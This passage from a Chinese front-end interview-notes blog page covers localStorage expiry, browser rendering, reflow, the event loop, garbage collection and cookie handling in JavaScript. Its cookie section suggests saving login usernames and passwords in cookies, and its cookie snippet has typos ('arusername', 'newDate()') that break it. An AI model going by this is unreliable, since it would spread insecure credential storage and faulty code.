0) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        var checkCount = 0;</span><br><span class="line">        while (checkCount &lt; 500) &#123;</span><br><span class="line">            var expireCount = 0;</span><br><span class="line">            //随机测试20个设置了过期时间的key</span><br><span class="line">            for (var i = 0; i &lt; 20; i++) &#123;</span><br><span class="line">                if (list.length == 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                var index = Math.floor(Math.random() * list.length);</span><br><span class="line">                var key = list[index];</span><br><span class="line">                var val = localStorage.getItem(list[index]);</span><br><span class="line">                //从list中删除被惰性删除的key</span><br><span class="line">                if (!val) &#123;</span><br><span class="line">                    list.splice(index, 1);</span><br><span class="line">                    expireCount++;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                val = JSON.parse(val);</span><br><span class="line">                //删除所有发现的已过期的key</span><br><span class="line">                if (val.expires &lt; new Date().getTime()) &#123;</span><br><span class="line">                    list.splice(index, 1);</span><br><span class="line">                    localStorage.removeItem(key);</span><br><span class="line">                    expireCount++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            //若删除的key不超过5个则跳出循环</span><br><span class="line">            if (expireCount &lt;= 5 || list.length == 0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            checkCount++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //每隔一秒执行一次定时删除</span><br><span class="line">    window.setInterval(self.check, 1000);</span><br><span class="line">    return self;</span><br><span class="line">&#125;(lsc || &#123;&#125;));</span><br></pre></td></tr></table></figure><h1 id="如何定时删除localstorage数据"><a href="#如何定时删除localstorage数据" class="headerlink" title="如何定时删除localstorage数据"></a>如何定时删除localstorage数据</h1><blockquote><p>定时删除是指，每隔一段时间执行一次删除操作，并通过限制删除操作执行的次数和频率，来减少删除操作对CPU的长期占用。另一方面定时删除也有效的减少了因惰性删除带来的对localStorage空间的浪费。</p></blockquote><p><strong>每隔一秒执行一次定时删除，操作如下：</strong></p><ol><li>随机测试20个设置了过期时间的key。</li><li>删除所有发现的已过期的key。</li><li>若删除的key超过5个则重复步骤1，直至重复500次。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">var lsc = (function (self) &#123;</span><br><span class="line">    var prefix = &#x27;one_more_lsc_&#x27;</span><br><span class="line">    var list = [];</span><br><span class="line">    //初始化list</span><br><span class="line">    self.init = function () &#123;</span><br><span class="line">        var keys = Object.keys(localStorage);</span><br><span class="line">        var reg = new RegExp(&#x27;^&#x27; + prefix);</span><br><span class="line">        var temp = [];</span><br><span class="line">        //遍历所有localStorage中的所有key</span><br><span class="line">        for (var i = 0; i &lt; keys.length; i++) &#123;</span><br><span class="line">            //找出可过期缓存的key</span><br><span class="line">            if (reg.test(keys[i])) &#123;</span><br><span class="line">                temp.push(keys[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        list = temp;</span><br><span class="line">    &#125;;</span><br><span class="line">    self.init();</span><br><span class="line">    self.check = function () &#123;</span><br><span class="line">        if (!list || list.length == 0) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        var checkCount = 0;</span><br><span class="line">        while (checkCount &lt; 500) &#123;</span><br><span class="line">            var expireCount = 0;</span><br><span class="line">            //随机测试20个设置了过期时间的key</span><br><span class="line">            for (var i = 0; i &lt; 20; i++) &#123;</span><br><span class="line">                if (list.length == 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                var index = Math.floor(Math.random() * list.length);</span><br><span class="line">                var key = list[index];</span><br><span class="line">                var val = localStorage.getItem(list[index]);</span><br><span class="line">                //从list中删除被惰性删除的key</span><br><span class="line">                if (!val) &#123;</span><br><span class="line">                    list.splice(index, 1);</span><br><span class="line">                    expireCount++;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                val = JSON.parse(val);</span><br><span class="line">                //删除所有发现的已过期的key</span><br><span class="line">                if (val.expires &lt; new Date().getTime()) &#123;</span><br><span class="line">                    list.splice(index, 1);</span><br><span class="line">                    localStorage.removeItem(key);</span><br><span class="line">                    expireCount++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            //若删除的key不超过5个则跳出循环</span><br><span class="line">            if (expireCount &lt;= 5 || list.length == 0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            checkCount++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //每隔一秒执行一次定时删除</span><br><span class="line">    window.setInterval(self.check, 1000);</span><br><span class="line">    return self;</span><br><span class="line">&#125;(lsc || &#123;&#125;));</span><br></pre></td></tr></table></figure><h1 id="localStorage-能跨域吗"><a href="#localStorage-能跨域吗" class="headerlink" title="localStorage 能跨域吗"></a>localStorage 能跨域吗</h1><p><font color="#FF00FF"><strong>不能</strong></font></p><p><strong>解决方案：</strong></p><ul><li>通过postMessage来实现跨源通信</li><li>可以实现一个公共的iframe部署在某个域名中，作为共享域</li><li>将需要实现localStorage跨域通信的页面嵌入这个iframe</li><li>接入对应的SDK操作共享域，从而实现localStorage的跨域存储</li></ul><p><img src="http://files.shanqianche.cn/20228/1660096289332.png" alt="共享域"></p><h1 id="memory-cache-如何开启"><a href="#memory-cache-如何开启" class="headerlink" title="memory cache 如何开启"></a>memory cache 如何开启</h1><blockquote><p>memory cache 如何开启是一种比较特殊的缓存，<font color="#FF8C00">他不受max-age、no-cache等配置的影响，即使我们不设置缓存，如果当前的内存空间比较充裕的话，一些资源还是会被缓存下来。但这种缓存是暂时的，一旦关闭了浏览器</font>，这一部分用于缓存的内存空间就会被释放掉<font color="#FF8C00">。如果真的不想使用缓存，可以设置no-store，这样，即便是内存缓存，<strong>也不会生效</strong>。</font></p></blockquote><h1 id="localstorage的限制"><a href="#localstorage的限制" class="headerlink" title="localstorage的限制"></a>localstorage的限制</h1><ol><li>浏览器的大小不统一，并且在IE8以上的IE版本才支持localStorage这个属性</li><li>目前所有的浏览器中都会把localStorage的值类型限定为string类型，这个在对我们日常比较常见的JSON对象类型需要一些转换</li><li>localStorage在浏览器的隐私模式下面是不可读取的</li><li>localStorage本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡</li><li>localStorage不能被爬虫抓取到</li></ol><h1 id="浏览器输入URL发生了什么"><a href="#浏览器输入URL发生了什么" class="headerlink" title="浏览器输入URL发生了什么"></a>浏览器输入URL发生了什么</h1><ol><li>URL 解析</li><li>DNS 查询</li><li>TCP 连接</li><li>处理请求</li><li>接受响应</li><li>渲染页面</li></ol><h1 id="浏览器如何渲染页面的"><a href="#浏览器如何渲染页面的" class="headerlink" title="浏览器如何渲染页面的"></a>浏览器如何渲染页面的</h1><ol><li>HTML 被 HTML 解析器解析成 DOM 树；</li><li>CSS 被 CSS 解析器解析成 CSSOM 树；</li><li>结合 DOM 树和 CSSOM 树，生成一棵渲染树(Render Tree)，这一过程称为 Attachment；</li><li>生成布局(flow)，浏览器在屏幕上“画”出渲染树中的所有节点；</li><li>将布局绘制(paint)在屏幕上，显示出整个页面。</li></ol><p><strong>不同的浏览器内核不同，所以渲染过程不太一样。</strong></p><p><img src="http://files.shanqianche.cn/20228/1660096647444.png" alt="webwit"><br><img src="http://files.shanqianche.cn/20228/1660096669266.png" alt="Mozilla"></p><p>由上面两张图可以看出，虽然主流浏览器渲染过程叫法有区别，但是主要流程还是相同的。<br>Gecko 将视觉格式化元素组成的树称为“框架树”。每个元素都是一个框架。WebKit 使用的术语是“呈现树”，它 由“呈现对象”组成。对于元素的放置，WebKit 使用的术语是“布局”，而 Gecko 称之为“重排”。对于连接 DOM 节点和可视化信息从而创建呈现树的过程，WebKit 使用的术语是“附加”。</p><h1 id="重绘、重排区别如何避免"><a href="#重绘、重排区别如何避免" class="headerlink" title="重绘、重排区别如何避免"></a>重绘、重排区别如何避免</h1><ol><li><p>重排(Reflow)：当渲染树的一部分必须更新并且节点的尺寸发生了变化，浏览器会使渲染树中受到影响的部分失效，并重新构造渲染树。</p></li><li><p>重绘(Repaint)：是在一个元素的外观被改变所触发的浏览器行为，浏览器会根据元素的新属性重新绘制，使元素呈现新的外观。比如改变某个元素的背景色、文字颜色、边框颜色等等</p></li><li><p>区别：重绘不一定需要重排（比如颜色的改变），重排必然导致重绘（比如改变网页位置）</p></li><li><p>引发重排</p></li><li><p>1 添加、删除可见的dom</p></li><li><p>2 元素的位置改变</p></li><li><p>3 元素的尺寸改变(外边距、内边距、边框厚度、宽高、等几何属性)</p></li><li><p>4 页面渲染初始化</p></li><li><p>5 浏览器窗口尺寸改变</p></li><li><p>6 获取某些属性。当获取一些属性时，浏览器为取得正确的值也会触发重排,它会导致队列刷新，这些属性包括：offsetTop、offsetLeft、offsetWidth、offsetHeight、scrollTop、scrollLeft、scrollWidth、scrollHeight、clientTop、clientLeft、clientWidth、clientHeight、getComputedStyle() (currentStyle in IE)。<strong>所以，在多次使用这些值时应进行缓存。</strong></p></li><li><p>优化</p></li></ol><p><strong>浏览器自己的优化：</strong><br>浏览器会维护1个队列，把所有会引起重排，重绘的操作放入这个队列，等队列中的操作到一定数量或者到了一定时间间隔，浏览器就会flush队列，进行一批处理，这样多次重排，重绘变成一次重排重绘</p><p><strong>减少 reflow/repaint</strong>：<br>（1）不要一条一条地修改DOM的样式。可以先定义好css的class，然后修改DOM的className。<br>（2）不要把 DOM 结点的属性值放在一个循环里当成循环里的变量。<br>（3）<font color="#FF8C00">为动画的 HTML 元件使用 fixed 或 absolute 的 position，那么修改他们的 CSS 是不会 reflow 的。</font><br>（4）千万<font color="#FF00FF">不要使用 table 布局</font>。因为可能很小的一个小改动会造成整个 table 的重新布局。(table及其内部元素除外，它可能需要多次计算才能确定好其在渲染树中节点的属性，通常要花3倍于同等元素的时间。这也是为什么我们要避免使用table做布局的一个原因。)<br>（5）<font color="#FF00FF">不要在布局信息改变的时候做查询（会导致渲染队列强制刷新）</font></p><h1 id="事件循环Event-loop"><a href="#事件循环Event-loop" class="headerlink" title="事件循环Event loop"></a>事件循环Event loop</h1><blockquote><p>主线程从”任务队列”中读取执行事件，这个过程是循环不断的，这个机制被称为<strong>事件循环</strong>。此机制具体如下:主 线程会不断从任务队列中按顺序取任务执行，每执行完一个任务都会<strong>检查microtask队列</strong>是否为空（执行完一个 任务的具体标志是函数执行栈为空），如果不为空则会一次性执行完所有microtask。然后再进入下一个循环去 任务队列中取下一个任务执行。</p></blockquote><p><strong>详细步骤：</strong></p><ol><li>选择当前要执行的宏任务队列，选择一个最先进入任务队列的宏任务，如果没有宏任务可以选择，则会 跳转至microtask的执行步骤。</li><li>将事件循环的当前运行宏任务设置为已选择的宏任务。</li><li>运行宏任务。</li><li>将事件循环的当前运行任务设置为null。</li><li>将运行完的宏任务从宏任务队列中移除。</li><li>microtasks步骤：进入microtask检查点。</li><li>更新界面渲染。</li><li>返回第一步。</li></ol><p><strong>执行进入microtask检查的的具体步骤如下:</strong></p><ol><li>设置进入microtask检查点的标志为true。</li><li>当事件循环的微任务队列不为空时：选择一个最先进入microtask队列的microtask；设置事件循环的当 前运行任务为已选择的microtask；运行microtask；<strong>设置事件循环的当前运行任务为null；将运行结束 的microtask从microtask队列中移除。</strong></li><li><strong>对于相应事件循环的每个环境设置对象（environment settings object）,通知它们哪些promise为 rejected。</strong></li><li>清理indexedDB的事务。</li><li>设置进入microtask检查点的标志为<strong>false。</strong></li></ol><p><font color="#FF8C00">需要注意的是:当前执行栈执行完毕时会立刻先处理所有微任务队列中的事件, 然后再去宏任务队列中取出一个 事件。同一次事件循环中, 微任务永远在宏任务之前执行。</font></p><p><img src="http://files.shanqianche.cn/20228/1660097684197.png" alt="队列"></p><h1 id="let-a-“sssssss”，存在哪儿"><a href="#let-a-“sssssss”，存在哪儿" class="headerlink" title="let a = “sssssss”，存在哪儿"></a>let a = “sssssss”，存在哪儿</h1><p><strong>使用let声明的全局变量不是挂在window对象下的，声明的全局变量存在于一个块级作用域中。</strong></p><p>打印一个全局函数，在let声明的全局变量在<font color="#FF00FF">全局函数的scope下</font>，我们平时使用时直接 用变量名称就能访问到</p><p><img src="http://files.shanqianche.cn/20228/1660098766506.png" alt="全局函数对象中scope"></p><h1 id="浏览器垃圾回收机制"><a href="#浏览器垃圾回收机制" class="headerlink" title="浏览器垃圾回收机制"></a>浏览器垃圾回收机制</h1><p>浏览器的 Javascript 具有自动垃圾回收机制(GC:Garbage Collecation)，也就是说，执行环境会负责管理代码执行过程中使用的内存。其原理是：<strong>垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存。</strong> 但是这个过程不是实时的，因为其开销比较大并且GC时停止响应其他操作，所以垃圾回收器会按照固定的时间间隔周期性的执行。</p><p>不再使用的变量也就是生命周期结束的变量，当然只可能是局部变量，<font color="#FF00FF">全局变量的生命周期直至浏览器卸载页面才会结束。</font>局部变量只在函数的执行过程中存在，而在这个过程中会为局部变量在栈或堆上分配相应的空间，以存储它们的值，然后在函数中使用这些变量，直至函数结束，<font color="#FF00FF">而闭包中由于内部函数的原因，外部函数并不能算是结束</font>。</p><p><font color="#FF8C00">标记清除和引用计数</font>。引用计数不太常用，标记清除较为常用。</p><h2 id="标记清除"><a href="#标记清除" class="headerlink" title="标记清除"></a>标记清除</h2><p>js中最常用的垃圾回收方式就是标记清除。当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。</p><p>垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记（当然，可以使用任何标记方式）。<font color="#FF00FF">然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）</font>。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间。 到目前为止，IE9+、Firefox、Opera、Chrome、Safari的js实现使用的都是标记清除的垃圾回收策略或类似的策略，只不过垃圾收集的时间间隔互不相同。</p><h2 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h2><p>引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function test()&#123;</span><br><span class="line">    var a = &#123;&#125; ;         //a的引用次数为0 </span><br><span class="line">    var b = a ;         //a的引用次数加1，为1 </span><br><span class="line">    var c =a;           //a的引用次数再加1，为2</span><br><span class="line">    var b =&#123;&#125;;          //a的引用次数减1，为1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Netscape Navigator3是最早使用引用计数策略的浏览器<font color="#FF00FF">，但很快它就遇到一个严重的问题：循环引用</font>。循环引用指的是对象A中包含一个指向对象B的指针，而对象B中也包含一个指向对象A的引用。</p><blockquote><p><font color="#FF00FF">IE中有一部分对象并不是原生js对象。例如，其内存泄露DOM和BOM中的对象就是使用C++以COM对象的形式实现的，而COM对象的垃圾回收机制采用的就是引用计数策略。因此，即使IE的js引擎采用标记清除策略来实现，但js访问的COM对象依然是基于引用计数策略的。换句话说，只要在IE中涉及COM对象，就会存在循环引用的问题。</font></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var element = document.getElementById(&quot;some_element&quot;);</span><br><span class="line">var myObject = new Object();</span><br><span class="line">myObject.e = element;</span><br><span class="line">element.o = myObject;</span><br></pre></td></tr></table></figure><p>这个例子在一个DOM元素<font color="#FF00FF">（element)与一个原生js对象（myObject)之间创建了循环引用。</font>其中，变量myObject有一个属性e指向element对象；而变量element也有一个属性o回指myObject。由于存在这个循环引用，即使例子中的DOM从页面中移除，它也永远不会被回收。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function outerFunction()&#123;</span><br><span class="line">    var obj = document.getElementById(&quot;element&quot;);</span><br><span class="line">    obj.onclick=function innerFunction()&#123;&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这段代码看起来没什么问题，但是obj引用了document.getElementById(‘element’)，<font color="#FF00FF">而document.getElementById(‘element’)的onclick方法会引用外部环境中的变量，自然也包括obj，是不是很隐蔽啊</font>。(在比较新的浏览器中在移除Node的时候已经会移除其上的event了，但是在老的浏览器，特别是ie上会有这个bug)</p><p><strong>解决办法：</strong><br>最简单的方式就是自己手工解除循环引用，比如刚才的函数可以这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">myObject.element = null;</span><br><span class="line">element.o = null;</span><br><span class="line"></span><br><span class="line">window.onload=function outerFunction()&#123;</span><br><span class="line">    var obj = document.getElementById(&quot;element&quot;);</span><br><span class="line">    obj.onclick=function innerFunction()&#123;&#125;;</span><br><span class="line">    obj=null;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将变量设置为null意味着切断变量与它此前引用的值之间的连接。当垃圾回收器下次运行时，就会删除这些值并回收它们占用的内存。</p><p><strong>要注意的是，IE9+并不存在循环引用导致Dom内存泄露问题，可能是微软做了优化，或者Dom的回收方式已经改变</strong></p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><h3 id="什么时候触发垃圾回收？"><a href="#什么时候触发垃圾回收？" class="headerlink" title="什么时候触发垃圾回收？"></a>什么时候触发垃圾回收？</h3><p>垃圾回收器周期性运行，如果分配的内存非常多，那么回收工作也会很艰巨，确定垃圾回收时间间隔就变成了一个值得思考的问题。<font color="#FF00FF">IE6的垃圾回收是根据内存分配量运行的，当环境中存在256个变量、4096个对象、64k的字符串任意一种情况的时候就会触发垃圾回收器工作</font>，看起来很科学，不用按一段时间就调用一次，有时候会没必要，这样按需调用不是很好吗？但是如果环境中就是有这么多变量等一直存在，现在脚本如此复杂，很正常，那么结果就是垃圾回收器一直在工作，这样浏览器就没法儿玩儿了。</p><p>微软在<font color="#FF00FF">IE7中做了调整，触发条件不再是固定的，而是动态修改的，初始值和IE6相同，如果垃圾回收器回收的内存分配量低于程序占用内存的15%，</font>说明大部分内存不可被回收，设的垃圾回收触发条件过于敏感，这时候把临街条件翻倍，<font color="#FF00FF">如果回收的内存高于85%，</font>说明大部分内存早就该清理了，这时候把触发条件置回。这样就使垃圾回收工作职能了很多</p><h3 id="合理的GC方案"><a href="#合理的GC方案" class="headerlink" title="合理的GC方案"></a>合理的GC方案</h3><h4 id="基础方案"><a href="#基础方案" class="headerlink" title="基础方案"></a>基础方案</h4><p>Javascript引擎基础GC方案是（<font color="#FF8C00">simple GC）：mark and sweep（标记清除）</font>，即：</p><ol><li>遍历所有可访问的对象。</li><li>回收已不可访问的对象。</li></ol><h4 id="GC的缺陷"><a href="#GC的缺陷" class="headerlink" title="GC的缺陷"></a>GC的缺陷</h4><p>和其他语言一样，javascript的GC策略也无法避免一个问题：GC时，停止响应其他操作，这是为了安全考虑。而Javascript的GC在100ms甚至以上，对一般的应用还好，但对于JS游戏，动画对连贯性要求比较高的应用，就麻烦了。这就是新引擎需要优化的点：<font color="#FF00FF">避免GC造成的长时间停止响应。</font></p><h4 id="GC优化策略"><a href="#GC优化策略" class="headerlink" title="GC优化策略"></a>GC优化策略</h4><p><strong>David大叔主要介绍了2个优化方案，而这也是最主要的2个优化方案了：</strong></p><ol><li><font color="#FF00FF">分代回收（Generation GC）</font> 这个和Java回收策略思想是一致的，也是V8所主要采用的。目的是通过区分“临时”与“持久”对象；多回收“临时对象”区（young generation），少回收“持久对象”区（tenured generation），减少每次需遍历的对象，从而减少每次GC的耗时。如图：</li></ol><p><img src="http://files.shanqianche.cn/20228/1660106399857.png" alt="分代回收"><br>这里需要补充的是：<font color="#FF8C00">对于tenured generation对象，有额外的开销：把它从young generation迁移到tenured generation，另外，如果被引用了，那引用的指向也需要修改。</font></p><ol start="2"><li><font color="#FF00FF">增量GC </font>这个方案的思想很简单，就是“每次处理一点，下次再处理一点，如此类推”。如图：</li></ol><p><img src="http://files.shanqianche.cn/20228/1660106521299.png" alt="增量GC"></p><p><font color="#FF00FF">这种方案，虽然耗时短，但中断较多，带来了上下文切换频繁的问题。</font></p><p>因为每种方案都其适用场景和缺点，因此在实际应用中，会根据实际情况选择方案。</p><p><font color="#FF8C00">比如：低 (对象/s) 比率时，中断执行GC的频率，simple GC更低些；如果大量对象都是长期“存活”，则分代处理优势也不大。</font></p><h1 id="顺序存储结构和链式存储结构的比较"><a href="#顺序存储结构和链式存储结构的比较" class="headerlink" title="顺序存储结构和链式存储结构的比较"></a>顺序存储结构和链式存储结构的比较</h1><p><strong>优缺点</strong></p><ol><li>顺序存储时，相邻数据元素的存放地址也相邻（逻辑与物理统一）；要求内存中可用存储单元的地址必须是连续的。<ul><li>优点：存储密度大（＝1），存储空间利用率高。</li><li>缺点：插入或删除元素时不方便。</li></ul></li><li>链式存储时，相邻数据元素可随意存放，但<font color="#FF8C00">所占存储空间分两部分，一部分存放结点值，另一部分存放表示结点间关系的指针</font><ul><li>优点：插入或删除元素时很方便，使用灵活。</li><li>缺点：存储密度小（&lt;1），存储空间利用率低</li></ul></li></ol><p><strong>使用情况</strong></p><ul><li>顺序表适宜于做查找这样的静态操作；</li><li>链表宜于做插入、删除这样的动态操作。</li><li>若线性表的长度变化不大，且其主要操作是查找，则采用顺序表；</li><li>若线性表的长度变化较大，且其主要操作是插入、删除操作，则采用链表</li></ul><p><strong>顺序表与链表的比较</strong></p><ul><li><strong>基于空间的比较</strong><ul><li>存储分配的方式<ul><li>顺序表的存储空间是静态分配的</li><li>链表的存储空间是动态分配的</li></ul></li><li>存储密度 = 结点数据本身所占的存储量/结点结构所占的存储总量<ul><li>顺序表的存储密度 = 1</li><li>链表的存储密度 &lt; 1</li></ul></li></ul></li><li><strong>基于时间的比较</strong><ul><li><font color="#FF00FF">存取方式</font><ul><li>顺序表可以随机存取，也可以顺序存取</li><li>链表是顺序存取的</li></ul></li><li>插入/删除时移动元素个数<ul><li><font color="#FF00FF">顺序表平均需要移动近一半元素</font></li><li>链表不需要移动元素，只需要修改指针</li></ul></li></ul></li></ul><h1 id="token-能放在cookie中吗"><a href="#token-能放在cookie中吗" class="headerlink" title="token 能放在cookie中吗"></a>token 能放在cookie中吗</h1><p><strong><font color="#FF8C00">能</font></strong></p><p><strong>解析：</strong></p><ul><li><font color="#FF8C00">token 是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，token 便应运而生。</font></li><li>「简单 token 的组成」:uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token 的前几位以哈希算法压缩成的一定长度的十六进制字符串）</li></ul><p><img src="http://files.shanqianche.cn/20228/1660107027666.png" alt="token认证流程"></p><ol><li>客户端使用用户名跟密码请求登录</li><li>服务端收到请求，去验证用户名与密码</li><li>验证成功后，服务端签发一个 token ，并把它发送给客户端</li><li>客户端接收 token 以后会把它存储起来，比如放在 cookie 里或者 localStorage 里</li><li>客户端每次发送请求时都需要带着服务端签发的 token（把 token 放到 HTTP 的 Header 里）</li><li>服务端收到请求后，需要验证请求里带有的 token ，如验证成功则返回对应的数据</li></ol><h1 id="js如何获取-禁用cookie"><a href="#js如何获取-禁用cookie" class="headerlink" title="js如何获取/禁用cookie"></a>js如何获取/禁用cookie</h1><h2 id="js如何获取cookies"><a href="#js如何获取cookies" class="headerlink" title="js如何获取cookies"></a>js如何获取cookies</h2><p>假设cookie中存储的内容为：name=jack;password=123，则在B页面中获取变量username的值的JS代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">arusername=document.cookie.split(&quot;;&quot;)[0].split(&quot;=&quot;)[1];</span><br><span class="line">//JS操作cookies方法!</span><br><span class="line">//写cookies</span><br><span class="line">function setCookie(name,value)&#123;</span><br><span class="line">var Days = 30;</span><br><span class="line">var exp =newDate();</span><br><span class="line">exp.setTime(exp.getTime() + Days*24*60*60*1000);</span><br><span class="line">document.cookie = name +&quot;=&quot;+ escape (value) +&quot;;expires=&quot;+ exp.toGMTString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//读取cookies</span><br><span class="line">function getCookie(name)&#123;</span><br><span class="line">var arr,reg=new RegExp(&quot;(^| )&quot;+name+&quot;=([^;]*)(;|$)&quot;);</span><br><span class="line">if(arr=document.cookie.match(reg))</span><br><span class="line">return unescape(arr[2]);</span><br><span class="line">else</span><br><span class="line">return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="cookie-是什么？"><a href="#cookie-是什么？" class="headerlink" title="cookie 是什么？"></a>cookie 是什么？</h2><ul><li>cookie 是存储于访问者计算机中的变量。每当一台计算机通过浏览器来访问某个页面时，那么就可以通过 JavaScript 来创建和读取 cookie。</li><li>实际上 cookie 是<font color="#FF8C00">存于用户硬盘的一个文件，这个文件通常对应于一个域名，当</font>浏览器再次访问这个域名时，便使这个cookie可用。因此，cookie可以跨越一个域名下的多个网页，但不能跨越多个域名使用。</li><li>不同浏览器对 cookie 的实现也不一样。即保存在一个浏览器中的 cookie 到另外一个浏览器是 不能获取的。</li></ul><p><strong>PS：cookie 和 session 都能保存计算机中的变量，但是 session 是运行在服务器端的，而客户端我们只能通过 cookie 来读取和创建变量</strong></p><h2 id="cookie-能做什么？"><a href="#cookie-能做什么？" class="headerlink" title="cookie 能做什么？"></a>cookie 能做什么？</h2><ul><li>用户在第一次登录某个网站时，要输入用户名密码，如果觉得很麻烦，下次登录时不想输入了，那么就在第一次登录时将登录信息存放在 cookie 中。下次登录时我们就可以直接获取 cookie 中的用户名密码来进行登录。</li></ul><p>PS:虽然 浏览器将信息保存<strong>在 cookie 中是加密了，但是可能还是会造成不安全的信息泄露</strong></p><ul><li>类似于购物车性质的功能，第一次用户将某些商品放入购物车了，但是临时有事，将电脑关闭了，下次再次进入此网站，我们可以通过读取 cookie 中的信息，恢复购物车中的物品。</li></ul><p>PS：实际操作中，这种方法很少用了，基本上都是将这些信息存储在数据库中。然后通过查询数据库的信息来恢复购物车里的物品</p><ul><li>页面之间的传值。在实际开发中，我们往往会通过一个页面跳转到另外一个页面。<strong>后端服务器我们可以通过数据库，session 等来传递页面所需要的值。但是在浏览器端，我们可以将数据保存在 cookie 中，然后在另外页面再去获取 cookie 中的数据。</strong></li></ul><p>PS：<font color="#FF8C00">这里要注意 cookie 的时效性，不然会造成获取 cookie 中数据的混乱。</font></p><h2 id="怎么使用-cookie？"><a href="#怎么使用-cookie？" class="headerlink" title="怎么使用 cookie？"></a>怎么使用 cookie？</h2><ol><li>语法<br>document.cookie = “name=value;expires=evalue; path=pvalue; domain=dvalue; secure;”</li></ol><p><strong>name=value 必选参数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 